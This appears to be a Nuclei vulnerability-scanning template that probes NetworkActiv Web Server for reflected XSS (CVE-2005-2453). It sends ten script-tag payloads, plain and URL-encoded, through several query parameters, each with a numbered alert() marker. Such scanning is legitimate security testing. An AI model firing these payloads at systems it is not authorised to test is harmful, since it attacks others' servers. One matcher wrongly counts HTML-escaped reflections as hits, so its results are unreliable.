id: networkactiv-web-xss-cve-2005-2453-first-hit
info:
  name: NetworkActiv Web Server - Reflected XSS via Query String (CVE-2005-2453) - first working payload
  author: Eslam Abu Bakr
  severity: medium
  description: |
    Reflected XSS in NetworkActiv Web Server (CVE-2005-2453).
    This template attempts multiple query string payloads, each with a unique marker.
    It stops at the first successful payload and extracts the marker so you can
    see which payload worked.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2005-2453
  tags: [networkactiv, xss, cve-2005-2453, first-hit]

requests:
  - method: GET
    # Stop after the first matching request for the target
    stop-at-first-match: true

    path:
      # Each path uses a unique token so we can identify which payload worked
      - "{{BaseURL}}/?q=\"><script>alert(90001)</script><\""
      - "{{BaseURL}}/?q=\"><script>alert(90002)</script><\""
      - "{{BaseURL}}/?q=\"><script>alert(90003)</script><\""
      - "{{BaseURL}}/?search=\"><script>alert(90004)</script><\""
      - "{{BaseURL}}/?s=\"><script>alert(90005)</script><\""
      - "{{BaseURL}}/?id=\"><script>alert(90006)</script><\""
      - "{{BaseURL}}/search?q=\"><script>alert(90007)</script><\""
      - "{{BaseURL}}/index.php?q=\"><script>alert(90008)</script><\""

      # encoded variants (in case target decodes differently)
      - "{{BaseURL}}/?q=%3Cscript%3Ealert(90009)%3C%2Fscript%3E"
      - "{{BaseURL}}/?q=%253Cscript%253Ealert(90010)%253C%252Fscript%253E"

    matchers-condition: or
    matchers:
      # detect raw reflected script tag with marker
      - type: regex
        regex:
          - "(?i)<script\\s*>\\s*alert\\(90[0-9]{3}\\)\\s*</script\\s*>"
        part: body

      # detect HTML-escaped reflection of the marker
      - type: regex
        regex:
          - "(?i)&lt;script&gt;\\s*alert\\(90[0-9]{3}\\)\\s*&lt;/script&gt;"
        part: body

    # Extractor: grab the unique marker (e.g., alert(90005))
    extractors:
      - type: regex
        name: reflected_marker
        regex:
          - "alert\\(90[0-9]{3}\\)"
        part: body
